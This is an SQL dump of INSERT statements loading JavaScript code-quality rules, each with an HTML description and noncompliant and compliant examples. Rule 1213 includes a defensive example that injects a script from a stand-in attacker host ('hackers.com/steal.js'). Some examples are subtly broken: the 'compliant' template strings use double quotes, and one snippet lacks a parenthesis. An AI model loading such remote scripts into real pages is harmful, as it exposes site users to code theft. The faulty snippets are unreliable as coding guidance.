INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1194, 'Only "while", "do" and "for" statements should be labelled', 'LabelPlacement', NULL, 'javascript', '<p>Any statement or block of statements can be identified by a label, but those labels should be used only on ''while'', ''do-while'' and ''for'' statements. Using labels in any other context leads to unstructured, confusing code. </p>
<h2>Noncompliant Code Example</h2>

<pre>
myLabel:if (i % 2 == 0) {  // Noncompliant
  if (i == 12) {
    print("12");
    break myLabel;
  }
  print("Odd number, but not 12");
}
</pre>
<h2>Compliant Solution</h2>

<pre>
myLabel:for (i = 0; i &lt; 10; i++) {   // Compliant
  print("Loop");
  break myLabel;
}
</pre>', 2, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, 'pitfall', false, 'HTML', 1510817813321, 1510817813321, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1195, '"switch" statements should not contain non-case labels', 'S1219', NULL, 'javascript', '<p>Even if it is legal, mixing case and non-case labels in the body of a switch statement is very confusing and can even be the result of a typing error.</p>
<h2>Noncompliant Code Examples</h2>

<p>Case 1, the code is syntactically correct but the behavior is not the expected one</p>
<pre>
switch (day) {
  case MONDAY:
  case TUESDAY:
  WEDNESDAY:   // instead of "case WEDNESDAY"
    doSomething();
    break;
  ...
}
</pre>
<p>Case 2, the code is correct and behaves as expected but is hardly readable </p>
<pre>
switch (day) {
  case MONDAY:
    break;
  case TUESDAY:
    foo:for(i = 0 ; i &lt; X ; i++) {
         /* ... */
        break foo;  // this break statement doesn''t relate to the nesting case TUESDAY
         /* ... */
    }
    break;
    /* ... */
}
</pre>
<h2>Compliant Solution</h2>

<p>Case 1</p>
<pre>
switch (day) {
  case MONDAY:
  case TUESDAY:
  case WEDNESDAY:
    doSomething();
    break;
  ...
}
</pre>
<p>Case 2</p>
<pre>
switch (day) {
  case MONDAY:
    break;
  case TUESDAY:
    compute(args); // put the content of the labelled "for" statement in a dedicated method
    break;

    /* ... */
}
</pre>
<h2>See</h2>

<ul>
<li> MISRA C:2004, 15.0 - The MISRA C <em>switch</em> syntax shall be used.</li>
<li> MISRA C++:2008, 6-4-3 - A switch statement shall be a well-formed switch statement.</li>
<li> MISRA C:2012, 16.1 - All switch statements shall be well-formed</li>
</ul>', 3, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'misra,pitfall', false, 'HTML', 1510817813322, 1510817813322, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1196, 'Octal values should not be used', 'OctalNumber', NULL, 'javascript', '<p>
Integer literals starting with a zero are octal rather than decimal values. While using octal values is fully supported, most developers do not have experience with them. They may not recognize octal values as such, mistaking them instead for decimal values.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
var myNumber = 010;   // myNumber will hold 8, not 10 - was this really expected?
</pre>

<h2>Compliant Solution</h2>
<pre>
var myNumber = 8;
</pre>

<h2>See</h2>

<ul>
<li> MISRA C:2004, 7.1 - Octal constants shall not be used</li>
<li> MISRA C++:2008, 2-13-2 - Octal constants (other than zero) and octal escape sequences (other than "\0") shall not be used</li>
<li> MISRA C:2012, 7.1 - Octal constants shall not be used</li>
<li> <a href="https://www.securecoding.cert.org/confluence/x/_QC7AQ">CERT DCL18-C</a> - Do not begin integer constants with 0 when specifying a decimal value</li>
</ul>', 2, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'cert,misra,pitfall', false, 'HTML', 1510817813323, 1510817813323, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1197, 'Unchanged variables should be marked "const"', 'S3353', NULL, 'javascript', '<p>Marking a variable that is unchanged after initialization <code>const</code> is an indication to future maintainers that "no this isn''t updated, and it''s not supposed to be".
  <code>const</code> should be used in these situations in the interests of code clarity.</p>

<h2>Noncompliant Code Example</h2>
<pre>
function seek(input) {
  let target = 32;  // Noncompliant
  for (let i of input) {
    if (i == target) {
      return true;
    }
  }
  return false;
}
</pre>

<h2>Compliant Solution</h2>
<pre>
function seek(input) {
  const target = 32;
  for (let i of input) {
    if (i == target) {
      return true;
    }
  }
  return false;
}
</pre>', 1, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'es2015', false, 'HTML', 1510817813324, 1510817813324, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1198, 'Copyright and license headers should be defined', 'S1451', NULL, 'javascript', '<p>
    Each source file should start with a header stating file ownership and the license which must be used to distribute the application.
</p>
<p>
    This rule must be fed with the header text that is expected at the beginning of every file.
</p>

<h2>Compliant Solution</h2>
<pre>
/*
 * SonarQube, open source software quality management tool.
 * Copyright (C) 2008-2013 SonarSource
 * mailto:contact AT sonarsource DOT com
 *
 * SonarQube is free software; you can redistribute it and/or
 * modify it under the terms of the GNU Lesser General Public
 * License as published by the Free Software Foundation; either
 * version 3 of the License, or (at your option) any later version.
 *
 * SonarQube is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 * Lesser General Public License for more details.
 *
 * You should have received a copy of the GNU Lesser General Public License
 * along with this program; if not, write to the Free Software Foundation,
 * Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
 */
</pre>', 4, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817813325, 1510817813325, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1199, 'Function declarations should not be made within blocks', 'FunctionDeclarationsWithinBlocks', NULL, 'javascript', '<p>
  While most script engines support function declarations within blocks, it is not part of ECMAScript 5 and below, and from browser to browser the implementations are inconsistent with each other. ECMAScript 5 and below only allows function declarations in the root statement list of a script or function. If you are targeting browsers that don''t support ECMAScript 6, use a variable initialized with a function expression to define a function within a block :
</p>

<h2>Noncompliant Code Example</h2>
<pre>
if (x) {
  function foo() {}
}
</pre>

<h2>Compliant Solution</h2>
<pre>
if (x) {
  var foo = function() {}
}
</pre>', 2, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'cross-browser,user-experience', false, 'HTML', 1510817813326, 1510817813326, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1200, 'Variables should not be shadowed', 'VariableShadowing', NULL, 'javascript', '<p>
  Overriding a variable declared in an outer scope can strongly impact the readability, and therefore the maintainability, of a piece of code. Further, it could lead maintainers to introduce bugs because they think they''re using one variable but are really using another.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
show: function(point, element) {
  if (!this.drops.length) return;
  var drop, affected = [];
  this.drops.each( function(drop) {  // Non-Compliant; defines a new ''drop'' parameter
    if(Droppables.isAffected(point, element, drop))
      affected.push(drop);
  });
</pre>

<h2>Compliant Solution</h2>
<pre>
show: function(point, element) {
  if (!this.drops.length) return;
  var drop, affected = [];
  this.drops.each( function(aDrop) {
    if(Droppables.isAffected(point, element, aDrop))
      affected.push(aDrop);
  });
</pre>', 2, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'pitfall', false, 'HTML', 1510817813327, 1510817813327, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1201, '"arguments" should not be accessed directly', 'S3513', NULL, 'javascript', '<p>The magic of JavaScript is that you can pass arguments to functions that don''t declare parameters, and on the other side, you can use those passed-in arguments inside the no-args <code>function</code>. </p>
<p>But just because you can, that does''t mean you should. The expectation and use of arguments inside functions that don''t explicitly declare them is confusing to callers. No one should ever have to read and fully understand a function to be able to use it competently. </p>
<p>If you don''t want to name arguments explicitly, use the <code>...</code> syntax to specify that an a variable number of arguments is expected. Then inside the function, you''ll be dealing with a first-class array, rather than an array-like structure.</p>

<h2>Noncompliant Code Example</h2>
<pre>
function concatenate() {
  let args = Array.prototype.slice.call(arguments);  // Noncompliant
  return args.join('', '');
}

function doSomething(isTrue) {
  var args = Array.prototype.slice.call(arguments, 1); // Noncompliant
  if (!isTrue) {
    for (var arg of args) {
      ...
    }
  }
}
</pre>

<h2>Compliant Solution</h2>
<pre>
function concatenate(...args) {
  return args.join('', '');
}

function doSomething(isTrue, ...values) {
  if (!isTrue) {
    for (var value of values) {
      ...
    }
  }
}
</pre>', 2, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'api-design,es2015', false, 'HTML', 1510817813328, 1510817813328, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1202, 'Built-in objects should not be overridden', 'S2424', NULL, 'javascript', '<p>
  Overriding an object changes its behavior and could potentially impact all code using that object. Overriding standard, built-in objects could therefore have broad,
  catastrophic effects on previously-working code.
</p>

<p>This rule detects overrides of the following native objects:</p>

<ul>
  <li>Fundamental objects - Object, Function, Boolean, Symbol, Error, EvalError, InternalError, RangeError, ReferenceError, SyntaxError, TypeError, URIError</li>
  <li>Numbers and dates - Number, Math, Date</li>
  <li>Text processing - String, RegExp</li>
  <li>Indexed collections - Array, Int8Array, Uint8Array, Uint8ClampedArray, Int16Array, Unit16Array, Int32Array, Uint32Array, Float32Array, Float64Array</li>
  <li>Keyed collections - Map, Set, WeakMap, WeakSet</li>
  <li>Structured data - ArrayBuffer, DataView, JSON</li>
  <li>Control abstraction objects - Promise</li>
  <li>Reflection - Reflect, Proxy</li>
  <li>Internationalization - Intl</li>
  <li>Non-standard objects - Generator, Iterator, ParallelArray, StopIteration</li>
</ul>', 3, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, 'confusing', false, 'HTML', 1510817813329, 1510817813330, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1203, 'Debugger statements should not be used', 'DebuggerStatement', NULL, 'javascript', '<p>The debugger statement can be placed anywhere in procedures to suspend execution. Using the debugger statement is similar to setting a breakpoint in the code. By definition such statement must absolutely be removed from the source code to prevent any unexpected behavior or added vulnerability to attacks in production.</p>
<h2>Noncompliant Code Example</h2>

<pre>
for (i = 1; i&lt;5; i++) {
  // Print i to the Output window.
  Debug.write("loop index is " + i);
  // Wait for user to resume.
  debugger;
}
</pre>
<h2>Compliant Solution</h2>

<pre>
for (i = 1; i&lt;5; i++) {
  // Print i to the Output window.
  Debug.write("loop index is " + i);
}
</pre>
<h2>See</h2>

<ul>
<li> <a href="http://cwe.mitre.org/data/definitions/489.html">MITRE, CWE-489</a> - Leftover Debug Code</li>
</ul>', 3, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'cwe,user-experience', false, 'HTML', 1510817813330, 1510817813331, 3);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1204, 'Short-circuit logic should be used to prevent null pointer dereferences in conditionals', 'S1697', NULL, 'javascript', 'When either the equality operator in a test for <code>null</code> or <code>undefined</code>, or the logical operator that follows it is reversed, the code has the appearance of safely null-testing the object before dereferencing it. Unfortunately the effect is just the opposite - the object is null-tested and then dereferenced only if it is <code>null</code>/<code>undefined</code>, leading to a guaranteed <code>TypeError</code>.

<h2>Noncompliant Code Sample</h2>
<pre>
if (str == null &amp;&amp; str.length == 0) {
  console.log("String is empty");
}

if (str == undefined &amp;&amp; str.length == 0) {
  console.log("String is empty");
}

if (str != null || str.length > 0) {
  console.log("String is not empty");
}

if (str != undefined || str.length > 0) {
  console.log("String is not empty");
}
</pre>

<h2>Compliant Solution</h2>
<pre>
if (str != null &amp;&amp; str.length == 0) {
  console.log("String is empty");
}

if (str != undefined &amp;&amp; str.length == 0) {
  console.log("String is empty");
}

if (str == null || str.length > 0) {
  console.log("String is not empty");
}

if (str == undefined || str.length > 0) {
  console.log("String is not empty");
}
</pre>', 4, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, NULL, false, 'HTML', 1510817813331, 1510817813332, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1205, 'Template strings should be used instead of concatenation', 'S3512', NULL, 'javascript', '<p>ECMAScript 2015 added the ability to use template literals instead of concatenation. Since their use is clearer and more concise, they are preferred in environments that support ECMAScript 2015.</p>
<p>This rule raises an issue when a string is created from the result of two or more concatenations.</p>

<h2>Noncompliant Code Example</h2>
<pre>
function sayHello(name) {
  console.log("hello " + name);  // ignored
}

function madLib(verb, noun) {
  console.log("I really " + verb + " one or two " + noun);  // Noncompliant
}
</pre>

<h2>Compliant Solution</h2>
<pre>
function sayHello(name) {
  console.log("hello ${name}");  // no issue raised before, but this is better
}

function madLib(verb, noun) {
  console.log("I really ${verb} one or two ${noun}");
}
</pre>', 1, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'clumsy,es2015', false, 'HTML', 1510817813332, 1510817813333, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1206, 'Tabulation characters should not be used', 'TabCharacter', NULL, 'javascript', '<p>
Developers should not need to configure the tab width of their text editors in order to be able to read source code. So the use of tabulation character must be banned.
</p>', 1, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'convention', false, 'HTML', 1510817813333, 1510817813334, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1207, 'Function names should comply with a naming convention', 'S100', NULL, 'javascript', '<p>
  Sharing some naming conventions is a key point to make it possible for a team to efficiently collaborate. This rule allows to check that all function names match a provided regular expression.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
function DoSomething(){...}
</pre>

<h2>Compliant Solution</h2>
<pre>
function doSomething(){...}
</pre>', 1, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'convention', false, 'HTML', 1510817813334, 1510817813335, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1208, 'Single quotes should be used for string literals', 'SingleQuote', NULL, 'javascript', '<p>
  For consistency single-quotes ('') are preferred to double-quotes (").
  This is helpful when creating strings that include HTML.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
var firstParameter = "something";
</pre>

<h2>Compliant Solution</h2>
<pre>
var firstParameter = ''something'';
</pre>', 1, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '1min', NULL, NULL, 'convention', false, 'HTML', 1510817813336, 1510817813336, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1209, '"indexOf" checks should not be for positive numbers', 'S2692', NULL, 'javascript', '<p>
  Most checks against an <code>indexOf</code> call against a string or array compare it with -1 because 0 is a valid index. Any checks which look for values >0 ignore the first element, which is likely a bug.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
var color = "blue";
var name = "ishmael";
var number = 123;

var arr = [color, name];

if (arr.indexOf("blue") > 0) { // Noncompliant
  // ...
}
if (arr[0].indexOf("ish") > 0 { // Noncompliant
  // ...
}
</pre>

<h2>Compliant Solution</h2>
<pre>
var color = "blue";
var name = "ishmael";
var number = 123;

var arr = [color, name];

if (arr.indexOf("blue") >= 0) {
  // ...
}
if (arr[0].indexOf("ish") > -1 {
  // ...
}
</pre>', 2, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, NULL, false, 'HTML', 1510817813337, 1510817813337, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1210, 'Unused function parameters should be removed', 'UnusedFunctionArgument', NULL, 'javascript', '<p>
  Unused parameters are misleading. Whatever the value passed to such parameters is, the behavior will be the same.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
function doSomething(a, b) { // "a" is unused
  return compute(b);
}
</pre>


<h2>Compliant Solution</h2>
<pre>
function doSomething(b) {
  return compute(b);
}
</pre>



<h2>Exceptions</h2>
<p>
  When writing function callbacks, some arguments might be required as part of the function signature, but not actually needed by the callback code.
  For instance, JQuery has the ''each'' helper to iterate over arrays or objects, but using the counter ''i'' should remain optional:
</p>
<pre>
$(["first", "last"]).each(function (i, value) {
  computeSomethingWithValue(value);
});
</pre>
<p>
  So only unused arguments listed at the end of the argument list will be flagged with issues because they could be omitted from the function signature.
  Unused arguments which are followed by an argument that _is_ used will be ignored.
</p>
<p>
  Examples :
</p>
<pre>
var myFirsCallBackFunction = function (p1, p2, p3, p4) {  //unused p2 is not reported but p4 is
                                              return p1 + p3; }

var mySecondCallBackFunction = function (p1, p2, p3, p4) {  //unused p1, p2 and p3 are not reported
                                              return p4; }

var myThirdCallBackFunction = function (p1, p2, p3, p4) {  //unused p1 is not reported but p3 and p4 are
                                              return p2; }
</pre>
<p>
  Further, when <code>arguments</code> is used in the function body, no parameter is reported as unused.
</p>
<pre>
function doSomething(a, b, c) {
  compute(arguments);
}
</pre>

<h2>See</h2>

<ul>
<li> MISRA C++:2008, 0-1-11</li>
<li> MISRA C:2012, 2.7</li>
</ul>', 2, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'misra,unused', false, 'HTML', 1510817813338, 1510817813338, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1211, 'Code should not be dynamically injected and executed to prevent Eval Injection vulnerability', 'Eval', NULL, 'javascript', '<p>The <code>eval</code> function is a way to run arbitrary code at run-time. Generally it is considered to be very dangerous because it allows execution of arbitrary code. Its use is thus discouraged. If you have carefully verified that there is no other option than to use this construct, pay special attention not to pass any user-provided data into it without properly validating it beforehand.</p>
<h2>Noncompliant Code Example</h2>

<pre>
eval(code_to_be_dynamically_executed)
</pre>
<h2>See</h2>

<ul>
<li> <a href="http://cwe.mitre.org/data/definitions/95.html">MITRE CWE-95</a> - CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code (''Eval Injection'')</li>
<li> <a href="https://www.owasp.org/index.php/Top_10_2013-A3-Cross-Site_Scripting_(XSS)">OWASP Top Ten 2013 Category A3</a> - Cross-Site Scripting (XSS)</li>
</ul>', 3, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '30min', NULL, NULL, 'cwe,owasp-a3', false, 'HTML', 1510817813339, 1510817813339, 3);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1212, 'Literal boolean values should not be used in condition expressions', 'S1125', NULL, 'javascript', '<p>
  Remove literal boolean values from conditional expressions to improve readability. Anything that can be tested for equality with a boolean value must itself be a boolean value, and boolean values can be tested atomically.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
if (booleanVariable == true) { /* ... */ }
if (booleanVariable != true) { /* ... */ }
if (booleanVariable || false) { /* ... */ }
doSomething(!false);
</pre>

<h2>Compliant Solution</h2>
<pre>
if (booleanVariable) { /* ... */ }
if (!booleanVariable) { /* ... */ }
if (booleanVariable) { /* ... */ }
doSomething(true);
</pre>

<h2>Exceptions</h2>
<p>
  The use of literal booleans in comparisons which use identity operators (<code>===</code> and <code>!==</code>) are ignored.
</p>', 1, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'clumsy', false, 'HTML', 1510817813340, 1510817813340, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1213, 'Untrusted content should not be included', 'S2611', NULL, 'javascript', '<p>Including content in your site from an untrusted source can expose your users to attackers and even compromise your own site. For that reason, this rule raises an issue for each non-relative URL.</p>
<h2>Noncompliant Code Example</h2>

<pre>
function include(url) {
  var s = document.createElement("script");
  s.setAttribute("type", "text/javascript");
  s.setAttribute("src", url);
  document.body.appendChild(s);
}
include("http://hackers.com/steal.js")  // Noncompliant
</pre>
<h2>See</h2>

<ul>
<li> <a href="http://cwe.mitre.org/data/definitions/829">MITRE, CWE-829</a> - Inclusion of Functionality from Untrusted Control Sphere
</li><li> <a href="http://www.sans.org/top25-software-errors/">SANS Top 25</a> - Risky Resource Management
</li></ul>', 3, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, 'cwe,sans-top25-risky', false, 'HTML', 1510817813340, 1510817813341, 3);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1214, 'Identical expressions should not be used on both sides of a binary operator', 'S1764', NULL, 'javascript', '<p>
  Using the same value on either side of a binary operator is almost always a mistake. In the case of logical operators, it is either a copy/paste error and therefore a bug, or it is simply wasted code, and should be simplified. In the case of bitwise operators and most binary mathematical operators, having the same value on both sides of an operator yields predictable results, and should be simplified.
</p>

<p>
This rule ignores <code>*</code>, <code>+</code>, and <code>=</code>.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
if ( a == a ) { // always true
  doZ();
}
if ( a != a ) { // always false
  doY();
}
if ( a == b &amp;&amp; a == b ) { // if the first one is true, the second one is too
  doX();
}
if ( a == b || a == b ) { // if the first one is true, the second one is too
  doW();
}

var j = 5 / 5; //always 1
var k = 5 - 5; //always 0
</pre>

<h2>Compliant Solution</h2>
<pre>
doZ();

if ( a == b ) {
  doX();
}
if ( a == b ) {
  doW();
}

var j = 1;
var k = 0;
</pre>

<h2>Exceptions</h2>
<p>The specific case of testing one variable against itself is a valid test for <code>NaN</code> and is therefore ignored.</p>
<p>Similarly, left-shifting 1 onto 1 is common in the construction of bit masks, and is ignored.</p>
<pre>
if(f !== f) { // test for NaN value
  console.log("f is NaN");
}

var i = 1 &lt;&lt; 1; // Compliant
var j = a &lt;&lt; a; // Noncompliant
</pre>

<h2>See</h2>

<ul>
<li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C</a> - Detect and remove code that has no effect</li>
<li> <a href="https://www.securecoding.cert.org/confluence/x/SIIyAQ">CERT, MSC12-CPP</a> - Detect and remove code that has no effect</li>
<li> Rule {rule:javascript:S1656} - Implements a check on <code>=</code>. </li>
</ul>', 3, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'cert', false, 'HTML', 1510817813342, 1510817813342, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1215, 'Return of boolean expressions should not be wrapped into an "if-then-else" statement', 'S1126', NULL, 'javascript', '<p>Return of boolean literal statements wrapped into <code>if-then-else</code> ones should be simplified.</p>
<h2>Noncompliant Code Example</h2>

<pre>
if (expression) {  
  return true;
} else {
  return false;
}
</pre>
<h2>Compliant Solution</h2>

<pre>
return expression; 
</pre>
<pre>
return !!expression;
</pre>', 1, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'clumsy', false, 'HTML', 1510817813343, 1510817813343, 1);
